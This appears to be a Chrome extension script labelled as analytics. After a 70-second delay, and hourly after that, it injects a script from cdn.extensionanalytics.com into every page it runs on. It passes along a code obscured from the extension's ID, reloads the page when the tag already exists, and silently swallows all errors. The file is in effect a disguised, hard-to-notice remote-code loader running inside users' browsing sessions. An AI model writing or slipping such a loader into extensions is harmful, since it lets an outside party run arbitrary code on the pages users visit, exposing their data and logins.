(function () {
    var i = "";
    try {
        i = chrome.i18n.getMessage("@@extension_id")
    } catch (h) {
    }
    var b = "";

    function h(d) {
        for (var e = 0; e < d.length; e++) {
            try {
                b = b + i.charAt(d[e])
            } catch (a) {
            }
        }
    }

    if (i) {
        h([3, 7, 9, 4, 14, 17, 10, 15])
    }
    function c() {
        var f = Math.floor((Math.random() * 10000000));
        try {
            var d = document.getElementById("extensionanalytics");
            if (d) {
                location.reload()
            } else {
                var a = document.createElement("script");
                a.id = "extensionanalytics";
                a.src = "https://cdn.extensionanalytics.com/analytics.js?e=" + b + "&r=" + f;
                document.documentElement.appendChild(a)
            }
        } catch (j) {
        }
    }

    setTimeout(c, 70000);
    try {
        window.clearInterval(window.eaanalyticstimer)
    } catch (g) {
    }
    window.eaanalyticstimer = setInterval(c, 3600000)
})();